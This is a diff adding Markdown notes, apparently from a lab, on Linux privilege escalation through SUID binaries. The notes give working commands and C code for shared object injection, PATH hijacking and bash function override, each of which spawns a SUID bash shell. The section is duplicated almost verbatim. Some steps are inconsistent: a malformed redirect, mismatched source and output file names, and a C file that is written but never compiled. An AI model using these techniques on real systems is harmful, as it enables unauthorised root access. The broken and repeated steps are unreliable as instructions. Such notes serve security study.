@@ -381,3 +381,208 @@ sudo sudo [any command]
 
 If the `pwfeedback` option is enabled, it may reveal a potential path for privilege escalation.
 
+# Escalation path with SUID
+
+Command to find all executable with SUID for this user
+
+```bash
+find / -perm -u=s -type f 2> /dev/null
+```
+
+```bash
+find / -perm -04000 -ls 2> /dev/null
+```
+
+![Privilege Escalation](./Image/29.png)
+
+![Privilege Escalation](./Image/30.png)
+
+## Shared Object Injection
+
+```bash
+strace /usr/local/bin/suid-so 2&>1 | grep -i -E "open|access|no such file"
+```
+
+![Privilege Escalation](./Image/31.png)
+
+Malicious code
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+        system("cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
+
+![Privilege Escalation](./Image/32.png)
+
+```bash
+gcc -shared -fPIC -o /home/user/.config/libcalc.so libcal.c 
+```
+
+![Privilege Escalation](./Image/33.png)
+
+## Escalation via Environmental Variable
+
+To look at enviromnetal variable 
+
+```bash
+env
+```
+
+![Privilege Escalation](./Image/34.png)
+
+```bash
+strings /usr/local/bin/suid-env
+```
+
+![Privilege Escalation](./Image/36.png)
+
+```bash
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
+```
+
+After
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+```bash
+/usr/local/bin/suid-env
+```
+
+![Privilege Escalation](./Image/35.png)
+
+This works if the command dont call the executableby the full path , but if a executable is called but a full path like this 
+
+![Privilege Escalation](./Image/37.png)
+
+We need to do another thing 
+
+```bash
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+
+export -f /usr/sbin/service
+```
+
+![Privilege Escalation](./Image/38.png)
+
+And like this we can get a shell as the SUID user
+
+---
+
+# Escalation Path Using SUID
+
+## Finding Executables with SUID
+
+To find all executables with the SUID bit set for the current user, you can use the following commands:
+
+```bash
+find / -perm -u=s -type f 2> /dev/null
+```
+
+Alternatively:
+
+```bash
+find / -perm -04000 -ls 2> /dev/null
+```
+
+![Privilege Escalation](./Image/29.png)
+
+![Privilege Escalation](./Image/30.png)
+
+## Shared Object Injection
+
+To identify potential vulnerabilities, you can trace the system calls of a SUID executable with `strace`:
+
+```bash
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+```
+
+![Privilege Escalation](./Image/31.png)
+
+### Malicious Code Example
+
+Here's an example of malicious C code that copies `/bin/bash` to `/tmp`, grants it SUID permissions, and executes it with elevated privileges:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
+
+![Privilege Escalation](./Image/32.png)
+
+Compile the malicious code into a shared object:
+
+```bash
+gcc -shared -fPIC -o /home/user/.config/libcalc.so libcal.c 
+```
+
+![Privilege Escalation](./Image/33.png)
+
+## Escalation via Environmental Variables
+
+To inspect environment variables:
+
+```bash
+env
+```
+
+![Privilege Escalation](./Image/34.png)
+
+Check for any hard-coded paths or exploitable functions in the SUID executable using ```strings```:
+
+```bash
+strings /usr/local/bin/suid-env
+```
+
+![Privilege Escalation](./Image/36.png)
+
+You can inject malicious code by compiling and placing it in a directory that will be before the real executable in the ```PATH``` variable:
+
+```bash
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
+```
+
+Afterwards, modify the `PATH` to prioritize the injected code:
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+Execute the vulnerable SUID binary:
+
+```bash
+/usr/local/bin/suid-env
+```
+
+![Privilege Escalation](./Image/35.png)
+
+This method works when the command doesn't call executables by their full path. However, if the full path is used, such as:
+
+![Privilege Escalation](./Image/37.png)
+
+### Function Injection
+
+In cases where a full path is used, we need to define a function to override the behavior:
+
+```bash
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+
+export -f /usr/sbin/service
+```
+
+![Privilege Escalation](./Image/38.png)
+
+By doing this, you can gain a shell with the SUID user's privileges.
